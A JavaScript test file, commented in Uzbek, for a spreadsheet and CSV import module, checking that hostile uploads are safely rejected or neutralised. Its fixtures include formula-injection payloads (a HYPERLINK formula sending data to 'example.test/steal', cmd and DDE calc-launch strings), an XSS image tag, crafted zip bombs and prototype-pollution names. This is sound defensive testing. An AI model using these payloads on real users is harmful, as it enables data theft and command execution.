/* P05b: .xlsx / .csv fayldan import (src/io/import.js) — oddiy fayllar va DUSHMAN fayllar.
   Test fayllari shu yerda yasaladi (SheetJS — loadXlsx(); mustaqil tekshiruv — exceljs / jszip); ikkilik fixture yo'q. */
'use strict';
const { test, before } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const JSZip = require('jszip');
const I = require('../../src/io/import.js');
const T = require('../../src/io/table-text.js');
const { loadXlsx } = require('../../src/io/vendor.js');

const ROOT = path.join(__dirname, '..', '..');
let XLSX;
before(async () => { XLSX = await loadXlsx(); });

const enc = s => new TextEncoder().encode(s);
function xlsxBytes(sheets) {           // { nom: { A1: cell, … , '!ref' } } yoki { nom: aoa }
  const wb = XLSX.utils.book_new();
  for (const [name, ws] of Object.entries(sheets)) XLSX.utils.book_append_sheet(wb, Array.isArray(ws) ? XLSX.utils.aoa_to_sheet(ws) : ws, name);
  return new Uint8Array(XLSX.write(wb, { type: 'array', bookType: 'xlsx', compression: true }));
}
const open = (name, bytes, limits) => I.openTableFile({ name }, bytes, loadXlsx, limits);

test('statik: src/io/ da tarmoq chaqiruvi yo\'q (fayl hech qayerga yuborilmaydi); SheetJS faqat vendor.js orqali; eval yo\'q', () => {
  const dir = path.join(ROOT, 'src/io');
  const files = fs.readdirSync(dir).filter(f => f.endsWith('.js'));
  assert.ok(files.length >= 7, String(files.length));
  for (const f of [...files.map(x => 'src/io/' + x), 'src/ui/io/app.js']) {
    const code = fs.readFileSync(path.join(ROOT, f), 'utf8').replace(/\/\*[\s\S]*?\*\//g, '').replace(/(^|[^:'"`])\/\/.*$/gm, '$1');
    for (const re of [/\bfetch\s*\(/, /XMLHttpRequest/, /sendBeacon/, /WebSocket/, /EventSource/, /\.postMessage\s*\(/, /\bimportScripts\b/, /firebase/i, /\beval\s*\(/, /new Function\b/, /https?:\/\//]) {
      assert.ok(!re.test(code), `${f}: ${re}`);
    }
    if (f !== 'src/io/vendor.js') assert.ok(!/\bimport\s*\(/.test(code), `${f}: dynamic import faqat vendor.js da`);
  }
  // UI qatlami: fayldan kelgan matn uchun innerHTML / insertAdjacentHTML / document.write ishlatilmaydi
  const ui = fs.readFileSync(path.join(ROOT, 'src/ui/io/app.js'), 'utf8');
  assert.ok(!/innerHTML|outerHTML|insertAdjacentHTML|document\.write/.test(ui));
  assert.ok(!/\son[a-z]+\s*=\s*["']/.test(ui));                                  // inline handler yo'q
  // SheetJS o'qish parametrlari: formulalar / HTML / uslublar / makroslar o'chirilgan
  const o = I.xlsxReadOptions({ sheetRows: 5 });
  assert.equal(o.cellFormula, false); assert.equal(o.cellHTML, false); assert.equal(o.cellStyles, false); assert.equal(o.bookVBA, false); assert.equal(o.sheetRows, 5);
});

test('chegaralar bir joyda (LIMITS); tur va hajm tahlildan OLDIN tekshiriladi', () => {
  assert.equal(I.LIMITS.maxBytes, 5 * 1024 * 1024);
  assert.equal(I.LIMITS.maxRows, 10000);
  assert.equal(I.LIMITS.maxCols, 200);
  assert.ok(Object.isFrozen(I.LIMITS));
  assert.deepEqual(I.precheck({ name: 'a.xlsx', size: 100 }), { ok: true, kind: 'xlsx' });
  assert.deepEqual(I.precheck({ name: 'A.CSV', size: 100 }), { ok: true, kind: 'csv' });
  assert.deepEqual(I.precheck({ name: 'a.xlsx', size: I.LIMITS.maxBytes + 1 }), { ok: false, reason: 'too_large' });
  assert.deepEqual(I.precheck({ name: 'a.csv', size: 0 }), { ok: false, reason: 'empty' });
  for (const n of ['a.xls', 'a.xlsm', 'a.ods', 'a.exe', 'a.html', 'xlsx', '']) assert.deepEqual(I.precheck({ name: n, size: 10 }), { ok: false, reason: 'unsupported_type' }, n);
});

test('XLSX import: oddiy fayl — sonlar to\'liq aniqlikda, matn, o\'nlik vergulli matn, sarlavha bo\'yicha moslash, bir nechta varaq', async () => {
  const bytes = xlsxBytes({
    Kirish: [['m, g', 'izoh', 'V'], [99.8312, 'a', 100.02], [0.1 + 0.2, null, '100,06'], [1 / 3, 'b', -0.125]],
    Ikkinchi: [[1, 2], [3, 4]],
  });
  const o = await open('lab.xlsx', bytes);
  assert.equal(o.ok, true); assert.equal(o.kind, 'xlsx');
  assert.deepEqual(o.sheets, ['Kirish', 'Ikkinchi']);
  const s = o.sheet(0);
  assert.equal(s.ok, true); assert.equal(s.nRows, 4); assert.equal(s.nCols, 3);
  assert.deepEqual(s.rows[2], [0.30000000000000004, null, '100,06']);
  assert.equal(T.isHeaderRow(s.rows[0]), true);
  const map = T.matchColumns(s.rows[0], [{ key: 'm' }, { key: 'V' }]);
  assert.deepEqual(map, [0, 2]);
  const r = T.applyMapping(s.rows, map, { header: true });
  assert.deepEqual(r.columns, [[99.8312, 0.30000000000000004, 1 / 3], [100.02, 100.06, -0.125]]);
  assert.equal(r.bad, 0);
  assert.deepEqual(o.sheet(1).rows, [[1, 2], [3, 4]]);
  assert.deepEqual(o.sheet(7), { ok: false, reason: 'no_sheet' });
});

test('XLSX import: laboratoriya Excel\'i (formulali) — saqlangan qiymatlar olinadi, formula matni o\'qilmaydi', async () => {
  const bytes = new Uint8Array(fs.readFileSync(path.join(ROOT, 'tests/fixtures/Zichlik_noaniqligi_hisobi.xlsx')));
  const o = await open('Zichlik.xlsx', bytes);
  assert.equal(o.ok, true);
  const i = o.sheets.indexOf('2_Kirish');
  assert.ok(i >= 0);
  const s = o.sheet(i);
  assert.equal(s.ok, true);
  // 2_Kirish!B6:C10 — kuzatuvlar (tests/cases/excel/excel-density.json dagi katak havolalari)
  assert.deepEqual(s.rows.slice(5, 10).map(r => [r[1], r[2]]), [[99.8312, 100.02], [99.8741, 100.06], [99.8103, 99.98], [99.8655, 100.04], [99.8236, 100]]);
  assert.ok(s.rows.flat().every(v => v === null || typeof v === 'number' || typeof v === 'string'));
});

test('formulalar HECH QACHON hisoblanmaydi: saqlangan qiymati yo\'q formula — bo\'sh; formula matni — matn (son emas); HYPERLINK / DDE / cmd', async () => {
  const ws = {
    A1: { t: 's', v: '=1+1' },                                           // MATN katagi
    B1: { t: 'n', f: '1+1' },                                            // formula, saqlangan qiymat YO'Q
    C1: { t: 'n', v: 7, f: 'SUM(3,4)' },                                 // formula + Excel saqlagan qiymat 7
    A2: { t: 's', v: 'x', f: 'HYPERLINK("http://example.test/steal?"&A1,"x")' },
    B2: { t: 's', v: "=cmd|' /C calc'!A0" },
    C2: { t: 's', v: '=DDE("cmd";"/C calc";"!A0")' },
    A3: { t: 's', v: '@SUM(1,2)' }, B3: { t: 's', v: '+1+1' }, C3: { t: 's', v: '-0,125' },
    A4: { t: 'b', v: true }, B4: { t: 'e', v: 7 }, C4: { t: 's', v: '<img src=x onerror=alert(1)>' },
    '!ref': 'A1:C4',
  };
  const s = (await open('f.xlsx', xlsxBytes({ S: ws }))).sheet(0);
  assert.equal(s.ok, true);
  assert.deepEqual(s.rows[0], ['=1+1', null, 7]);                        // 2 emas: hisoblanmagan; 7 — faylda saqlangan qiymat
  assert.equal(s.rows[1][0], 'x');
  const json = JSON.stringify(s.rows);
  assert.ok(!json.includes('HYPERLINK') && !json.includes('SUM(3,4)'), 'formula matni o\'qilmasligi kerak');
  const nums = s.rows.map(r => r.map(c => T.parseNumber(c)));
  assert.ok(Number.isNaN(nums[0][0]));                                   // "=1+1" → son emas
  assert.ok(Number.isNaN(nums[1][1]) && Number.isNaN(nums[1][2]) && Number.isNaN(nums[2][0]) && Number.isNaN(nums[2][1]));
  assert.equal(nums[2][2], -0.125);                                      // oddiy manfiy son — son
  assert.ok(Number.isNaN(nums[3][0]) && nums[3][1] === null && Number.isNaN(nums[3][2]));   // TRUE, #xato, HTML
  // kuzatuv ustuni sifatida: formula / HTML kataklari bo'sh
  const r = T.applyMapping(s.rows, [0, 2]);
  assert.deepEqual(r.columns, [['', '', '', ''], [7, '', -0.125, '']]);
  assert.equal(r.bad, 6);
});

test('dushman fayl: juda katta (bayt) — tahlilsiz rad; buzilgan / xlsx bo\'lmagan ikkilik — xato kodi (istisno chiqmaydi)', async () => {
  let loaded = 0;
  const big = new Uint8Array(I.LIMITS.maxBytes + 1);
  big.set([0x50, 0x4b, 3, 4]);
  assert.deepEqual(await I.openTableFile({ name: 'big.xlsx' }, big, () => { loaded++; return loadXlsx(); }), { ok: false, reason: 'too_large' });
  assert.deepEqual(await I.openTableFile({ name: 'big.csv' }, new Uint8Array(I.LIMITS.maxBytes + 1).fill(49), loadXlsx), { ok: false, reason: 'too_large' });
  assert.equal(loaded, 0, 'kutubxona yuklanmasligi kerak');
  const good = xlsxBytes({ S: [[1, 2]] });
  const cases = {
    'tasodifiy baytlar': [Uint8Array.from({ length: 4096 }, (_, i) => (i * 7919) % 256), 'not_xlsx'],
    'matn (.xlsx nomi bilan)': [enc('a;b\n=1+1;2\n'), 'not_xlsx'],
    'HTML': [enc('<html><table><tr><td>1</td></tr></table></html>'), 'not_xlsx'],
    'eski .xls (CFB) sarlavhasi': [new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1, 0, 0, 0, 0]), 'not_xlsx'],
    'kesilgan zip': [good.slice(0, Math.floor(good.length / 2)), 'bad_xlsx'],
    'faqat PK sarlavha': [new Uint8Array([0x50, 0x4b, 3, 4, 0, 0, 0, 0, 0, 0]), 'bad_xlsx'],
  };
  for (const [name, [bytes, reason]] of Object.entries(cases)) {
    const r = await open('x.xlsx', bytes);
    assert.deepEqual(r, { ok: false, reason }, name);
  }
  // zip to'g'ri, lekin ichidagi XML buzilgan → xato kodi yoki bo'sh varaq, istisno emas
  const zip = await JSZip.loadAsync(good);
  zip.file('xl/worksheets/sheet1.xml', '<worksheet><sheetData><row r="1"><c r="A1"><v>1</v>');
  zip.file('xl/workbook.xml', '<<<not xml');
  const broken = new Uint8Array(await zip.generateAsync({ type: 'uint8array' }));
  const r = await open('x.xlsx', broken);
  assert.equal(r.ok, false);
  assert.ok(I.IMPORT_ERRORS.includes(r.reason), r.reason);
  // xlsx bo'lmagan zip
  const z2 = new JSZip(); z2.file('readme.txt', 'salom');
  assert.deepEqual(await open('x.xlsx', new Uint8Array(await z2.generateAsync({ type: 'uint8array' }))), { ok: false, reason: 'not_xlsx' });
  // .csv nomi bilan zip / ikkilik
  assert.deepEqual(await open('x.csv', good), { ok: false, reason: 'bad_csv' });
  assert.deepEqual(await open('x.csv', new Uint8Array([1, 0, 2, 0, 3])), { ok: false, reason: 'bad_csv' });
  assert.deepEqual(await open('x.xlsx', null), { ok: false, reason: 'read_failed' });
});

test('dushman fayl: juda ko\'p qator / ustun / varaq — to\'liq rad (qisman import yo\'q); chegaradagi fayl qabul qilinadi', async () => {
  const L = { ...I.LIMITS, maxRows: 300, maxCols: 20, maxSheets: 3 };
  const rows = n => Array.from({ length: n }, (_, i) => [i, i / 7]);
  assert.equal((await open('ok.xlsx', xlsxBytes({ S: rows(300) }), L)).sheet(0).nRows, 300);
  assert.deepEqual((await open('rows.xlsx', xlsxBytes({ S: rows(301) }), L)).sheet(0), { ok: false, reason: 'too_many_rows' });
  assert.equal((await open('ok.xlsx', xlsxBytes({ S: [Array.from({ length: 20 }, (_, i) => i)] }), L)).sheet(0).nCols, 20);
  assert.deepEqual((await open('cols.xlsx', xlsxBytes({ S: [Array.from({ length: 21 }, (_, i) => i)] }), L)).sheet(0), { ok: false, reason: 'too_many_cols' });
  assert.deepEqual(await open('sheets.xlsx', xlsxBytes({ a: [[1]], b: [[1]], c: [[1]], d: [[1]] }), L), { ok: false, reason: 'too_many_sheets' });
  // haqiqiy chegaralar bilan: 10 001 qator
  assert.deepEqual((await open('rows.xlsx', xlsxBytes({ S: rows(I.LIMITS.maxRows + 1) }))).sheet(0), { ok: false, reason: 'too_many_rows' });
  // CSV
  const csv = n => enc(Array.from({ length: n }, (_, i) => `${i};${i},5`).join('\n'));
  assert.equal((await open('ok.csv', csv(300), L)).sheet(0).nRows, 300);
  assert.deepEqual(await open('rows.csv', csv(301), L), { ok: false, reason: 'too_many_rows' });
  assert.deepEqual(await open('cols.csv', enc(Array.from({ length: 21 }, (_, i) => i).join(';')), L), { ok: false, reason: 'too_many_cols' });
});

test('dushman fayl: ulkan e\'lon qilingan o\'lcham (A1:XFD1048576) — qator chegarasi bilan kesiladi, xotira to\'lmaydi; zip-bomba katalogdan aniqlanadi', async () => {
  const good = xlsxBytes({ S: [[1.5, 2.5], [3.5, 4.5]] });
  const zip = await JSZip.loadAsync(good);
  const xml = await zip.file('xl/worksheets/sheet1.xml').async('string');
  assert.match(xml, /<dimension ref="A1:B2"\/>/);
  zip.file('xl/worksheets/sheet1.xml', xml.replace('<dimension ref="A1:B2"/>', '<dimension ref="A1:XFD1048576"/>'));
  const huge = new Uint8Array(await zip.generateAsync({ type: 'uint8array', compression: 'DEFLATE' }));
  const t0 = Date.now();
  const s = (await open('huge.xlsx', huge)).sheet(0);
  assert.ok(Date.now() - t0 < 5000, 'tez bajarilishi kerak');
  assert.deepEqual(s, { ok: true, rows: [[1.5, 2.5], [3.5, 4.5]], nRows: 2, nCols: 2 });   // faqat haqiqiy kataklar
  // (maxRows + 1)-qatordagi yagona katak: sheetRows undan narisini xotiraga olmaydi → rad
  const far = { A1: { t: 'n', v: 1 }, ['A' + (I.LIMITS.maxRows + 1)]: { t: 'n', v: 2 }, A1048576: { t: 'n', v: 3 }, '!ref': 'A1:A1048576' };
  const wb = XLSX.utils.book_new(); XLSX.utils.book_append_sheet(wb, far, 'S');
  // (SheetJS yozuvchisi !ref bo'yicha yuradi — siyrak varaqni o'zimiz XML sifatida yozamiz)
  const z3 = await JSZip.loadAsync(good);
  z3.file('xl/worksheets/sheet1.xml', xml.replace(/<sheetData>[\s\S]*<\/sheetData>/, `<sheetData><row r="1"><c r="A1"><v>1</v></c></row><row r="${I.LIMITS.maxRows + 1}"><c r="A${I.LIMITS.maxRows + 1}"><v>2</v></c></row><row r="1048576"><c r="XFD1048576"><v>3</v></c></row></sheetData>`));
  assert.deepEqual((await open('far.xlsx', new Uint8Array(await z3.generateAsync({ type: 'uint8array' })))).sheet(0), { ok: false, reason: 'too_many_rows' });
  // 1-qatorda XFD ustunidagi katak → ustun chegarasi
  const z4 = await JSZip.loadAsync(good);
  z4.file('xl/worksheets/sheet1.xml', xml.replace(/<sheetData>[\s\S]*<\/sheetData>/, '<sheetData><row r="1"><c r="A1"><v>1</v></c><c r="XFD1"><v>3</v></c></row></sheetData>'));
  assert.deepEqual((await open('wide.xlsx', new Uint8Array(await z4.generateAsync({ type: 'uint8array' })))).sheet(0), { ok: false, reason: 'too_many_cols' });

  // zip-bomba: markaziy katalogda e'lon qilingan ochilgan hajm chegaradan katta → hech narsa ochilmasdan rad
  const info = I.zipInfo(good);
  assert.equal(info.ok, true);
  assert.ok(info.names.includes('xl/workbook.xml') && info.unzipped > 0);
  const bomb = good.slice();
  const dv = new DataView(bomb.buffer);
  let patched = 0;
  for (let i = 0; i + 46 < bomb.length; i++) if (dv.getUint32(i, true) === 0x02014b50) { dv.setUint32(i + 24, 0x7ffffff0, true); patched++; break; }
  assert.equal(patched, 1);
  assert.deepEqual(I.zipInfo(bomb), { ok: false, reason: 'zip_too_big' });
  assert.deepEqual(await I.openTableFile({ name: 'bomb.xlsx' }, bomb, () => { throw new Error('kutubxona yuklanmasligi kerak'); }), { ok: false, reason: 'zip_too_big' });
  // haqiqiy siqilgan "bomba": 80 MB nol — katalogdagi hajm bo'yicha rad
  const z5 = await JSZip.loadAsync(good);
  z5.file('xl/worksheets/sheet1.xml', new Uint8Array(80 * 1024 * 1024));
  const real = new Uint8Array(await z5.generateAsync({ type: 'uint8array', compression: 'DEFLATE' }));
  assert.ok(real.length < I.LIMITS.maxBytes, String(real.length));        // fayl kichik, ichi katta
  assert.deepEqual(await open('bomb2.xlsx', real), { ok: false, reason: 'zip_too_big' });
  // ZIP64 belgilari — rad
  const z64 = good.slice();
  const dv2 = new DataView(z64.buffer);
  for (let i = z64.length - 22; i >= 0; i--) if (dv2.getUint32(i, true) === 0x06054b50) { dv2.setUint16(i + 10, 0xffff, true); break; }
  assert.deepEqual(I.zipInfo(z64), { ok: false, reason: 'bad_xlsx' });
});

test('prototip ifloslanishi yo\'q: __proto__ / constructor nomli varaq, sarlavha va kataklar', async () => {
  const bytes = xlsxBytes({ S: [['__proto__', 'constructor', 'prototype', 'm'], [1, 2, 3, 4], ['{"polluted":true}', 'toString', '__proto__', 5]] });
  const o = await open('p.xlsx', bytes);
  const s = o.sheet(0);
  assert.equal(s.ok, true);
  const map = T.matchColumns(s.rows[0], [{ key: 'm' }, { key: '__proto__' }, { key: 'constructor' }]);
  assert.deepEqual(map, [3, 0, 1]);
  const r = T.applyMapping(s.rows, map, { header: true });
  assert.deepEqual(r.columns, [[4, 5], [1, ''], [2, '']]);
  const csv = (await open('p.csv', enc('__proto__;constructor;m\n1;2;3\n[object Object];x;4'))).sheet(0);
  assert.deepEqual(T.applyMapping(csv.rows, T.matchColumns(csv.rows[0], [{ key: 'm' }]), { header: true }).columns, [[3, 4]]);
  // varaq nomi "__proto__" bo'lgan fayl: varaq indeks bilan tanlanadi, obyekt kaliti sifatida ishonilmaydi
  const good = xlsxBytes({ Sheet1: [[1, 2]] });
  const zip = await JSZip.loadAsync(good);
  const wbXml = await zip.file('xl/workbook.xml').async('string');
  assert.match(wbXml, /name="Sheet1"/);
  zip.file('xl/workbook.xml', wbXml.replace('name="Sheet1"', 'name="__proto__"'));
  const evil = await open('e.xlsx', new Uint8Array(await zip.generateAsync({ type: 'uint8array' })));
  if (evil.ok) { const sh = evil.sheet(0); assert.ok(sh.ok === true || I.IMPORT_ERRORS.includes(sh.reason)); } else assert.ok(I.IMPORT_ERRORS.includes(evil.reason));
  assert.equal(Object.prototype.polluted, undefined);
  assert.equal(({}).S, undefined); assert.equal(({}).m, undefined); assert.equal(({})['!ref'], undefined); assert.equal(({})['!data'], undefined);
  assert.deepEqual(Object.keys(Object.prototype), []);
});

test('CSV import: oddiy fayl, o\'nlik vergul, qo\'shtirnoqli maydonlar, sarlavha bo\'yicha moslash; windows-1251; ajratuvchini qo\'lda tanlash', async () => {
  const o = await open('data.csv', enc('﻿"m, g";"izoh";V\r\n99,8312;"a;b";100,02\r\n"99,8741";"u ""x""";"1,0006e2"\r\n'));
  assert.equal(o.ok, true); assert.equal(o.kind, 'csv'); assert.equal(o.delimiter, ';');
  const s = o.sheet(0);
  assert.deepEqual(s.rows, [['m, g', 'izoh', 'V'], ['99,8312', 'a;b', '100,02'], ['99,8741', 'u "x"', '1,0006e2']]);
  const r = T.applyMapping(s.rows, T.matchColumns(s.rows[0], [{ key: 'm' }, { key: 'V' }]), { header: true });
  assert.deepEqual(r.columns, [[99.8312, 99.8741], [100.02, 100.06]]);
  // vergul bilan ajratilgan, o'nlik nuqta
  assert.deepEqual((await open('en.csv', enc('x,y\n1.5,2.5\n-0.125,+1.5\n'))).sheet(0).rows, [['x', 'y'], ['1.5', '2.5'], ['-0.125', '+1.5']]);
  // windows-1251 (eski Excel "CSV (разделители — точка с запятой)")
  const cp1251 = new Uint8Array([0xd2, 0xee, 0xea, 0x3b, 0x79, 0x0a, 0x31, 0x2c, 0x35, 0x3b, 0x32]);   // "Ток;y\n1,5;2"
  assert.deepEqual((await open('ru.csv', cp1251)).sheet(0).rows, [['Ток', 'y'], ['1,5', '2']]);
  // bitta ustun, o'nlik vergul — avtomatik aniqlash noaniq; ';' qo'lda tanlansa to'g'ri
  const one = await open('one.csv', enc('1,5\n2,5\n-0,125\n'));
  assert.deepEqual(one.sheet(0).rows[0], ['1', '5']);
  assert.deepEqual(one.sheet(0, { delimiter: ';' }).rows, [['1,5'], ['2,5'], ['-0,125']]);
});
